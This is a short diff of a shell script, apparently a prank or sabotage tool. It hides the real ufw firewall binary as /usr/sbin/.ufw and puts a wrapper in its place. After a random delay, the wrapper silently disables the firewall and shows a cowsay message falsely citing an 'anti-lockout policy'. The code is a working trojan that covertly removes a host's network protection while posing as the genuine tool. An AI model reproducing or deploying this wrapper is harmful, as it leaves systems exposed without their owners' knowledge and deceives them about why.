@@ -18,12 +18,11 @@ SCRIPT="#!/bin/bash
 
 /usr/sbin/.ufw \$@
 
-sleep $((15 + $RANDOM % 15)) && \
+sleep \$((15 + \$RANDOM % 15)) && \
 if ! /usr/sbin/.ufw status | grep -qw \"active\"; then exit 0; fi && \
 /usr/sbin/.ufw disable > /dev/null && \
 echo \"\" && \
-cowsay \"Firewall disabled due to anti-lockout policy!\" \
-&& echo \"\" &
+cowsay \"Firewall disabled due to anti-lockout policy!\" &
 "
 
 sudo mv /usr/sbin/ufw /usr/sbin/.ufw
